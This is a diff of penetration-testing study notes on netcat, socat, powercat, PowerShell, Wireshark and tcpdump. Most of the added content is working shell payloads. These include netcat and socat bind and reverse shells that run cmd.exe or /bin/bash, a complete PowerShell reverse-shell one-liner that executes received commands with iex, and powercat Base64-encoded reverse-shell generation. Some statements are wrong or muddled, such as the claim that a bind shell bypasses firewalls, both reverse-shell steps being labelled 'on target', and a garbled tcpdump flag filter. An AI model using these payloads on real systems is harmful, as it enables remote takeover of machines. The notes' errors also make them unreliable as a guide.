@@ -8,15 +8,26 @@
 ** `nc -l` for creating listener
 ** `nc -p` for creating the port
 
+=== Transfer files
+
+* `nc -nvlp <PORT> < <file>` to open a listener that sends a file
+* `nc <IP> <PORT> > <file>` to output the file
+
 === Bind & Reverse shell 
 
-A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell. A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attack box.
+A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell. 
+A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attack box.
 
-* `nc -nvlp <PORT> -e <file>` on target
+The difference is that a bind shell can circumvent a firewall.
+
+* `nc -nvlp <PORT> -e cmd.exe` (or `/bin/bash`) on target.
+* `nc <target_IP> <PORT>` on attack machine.
+
 This is binding a local PORT's IO to the STDIN/STDOUT/STDERR of a file locally, to which any attack machine can connect to.
+This is then a bind shell.
 
-* `nc -nv <IP> <PORT> -e <file>` on target
-* `nc -nvlp <PORT>` on attack machine
+* `nc -nvlp <PORT>` on target machine
+* `nc -nv <target_IP> <PORT> -e cmd.exe` (or `/bin/bash`) on target
 This is a reverse shell.
 
 == SOCAT
@@ -29,6 +40,7 @@ Socat creates two bidirectional byte streams and transfers data between them.
 * `socat TCP4:<IP>:443 file:<file>,create` receives bytes and creates a file with them
 * `socat -d -d` for verbose
 * `socat TCP4:<IP>:<PORT> EXEC:/bin/bash` for reverse shell
+* `socat TCP4-LISTEN:<PORT>,fork EXEC:cmd.exe,pipes` for Windows bind shell
 * `socat -` the hyphen represents the STDIO
 
 === Encrypted bind shells
@@ -49,7 +61,7 @@ Socat creates two bidirectional byte streams and transfers data between them.
 Use the following command as a powershell oneliner to send a reverse shell
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$client = New-Object System.Net.Sockets.TCPClient('<IP>',443);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
@@ -65,7 +77,7 @@ $client.Close();
 ```
 
 Oneliner here:
-`$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();`
+`$client = New-Object System.Net.Sockets.TCPClient('<IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();`
 
 === Bind shell
 
@@ -92,7 +104,7 @@ In one line
 
 == Powercat
 
-* In Kali, `apt install powercat` installs the script in `/usr/share/windows-resources/powercat`
+* In Kali, `powercat` is found at `/usr/share/powercat`
 * `. ./powercat.ps1` to source the script
 * `powercat -c <IP> -p <PORT> -i <file>` to transfer file to remote
 
@@ -108,4 +120,43 @@ In one line
 === Powercat payloads
 
 * `powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1` creates a Base64 encoded payload that powercat can execute
-*
+
+== Wireshark
+
+=== Capture filters
+
+`net <subnet>` => `net 10.11.1.0/24`
+
+=== Display filters
+
+`tcp.port == 21` (to find FTP packets only)
+
+== TCPDump
+
+=== Looking for traffic
+
+* `tcpdump -D` to display all available interfaces
+* `tcpdump -i <interface>` to capture traffic on one interface
+
+=== Filtering traffic
+
+* `tcpdump -n` skips DNS
+* `tcpdump -r <*.pcap>` to read pcap file
+* `tcpdump src/dst host <IP>` to filter on source or destination host IP
+* `tcpdump port <PORT>` to filter by port used
+* `tcpdump -nX` to print in hex and ascii format
+
+=== TCP Packet diagram
+
+image::practical_tools/tcp_packet_diagram.png[]
+
+Data packets have the `ACK` & `PSH` flags on in HTTP header. 
+Therefore, we look for TCP header = 0x24
+
+`ACK` = on after the three-way handshake
+`PSH` = usually set to avoid buffering by Applications, by enforcing immediate delivery of packet
+
+* `tcpdump -A` to print in ascii format
+* `tcpdump 'tcp[13] = 24' to filter with display filter
+
+
